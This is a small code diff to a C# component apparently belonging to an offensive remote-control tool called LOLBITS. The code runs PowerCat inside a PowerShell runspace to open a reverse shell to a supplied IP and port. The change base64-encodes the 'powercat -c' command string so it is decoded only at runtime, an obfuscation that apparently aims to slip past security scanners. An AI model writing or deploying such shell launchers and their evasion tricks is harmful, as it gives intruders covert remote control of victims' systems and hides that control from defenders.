@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Management.Automation.Runspaces;
+using System.Text;
 using System.Threading;
 
 namespace LOLBITS.Controlling
@@ -29,7 +30,7 @@ namespace LOLBITS.Controlling
 
                 var pipeline = rs.CreatePipeline();
                 pipeline.Commands.AddScript(PowerCat.PowerCatBase64());
-                pipeline.Commands.AddScript("powercat -c " + ip + "  " + port + " -ep");
+                pipeline.Commands.AddScript(Encoding.UTF8.GetString(Convert.FromBase64String("cG93ZXJjYXQgLWMg")) + ip + "  " + port + " -ep");
                 pipeline.Invoke();
             }
         }
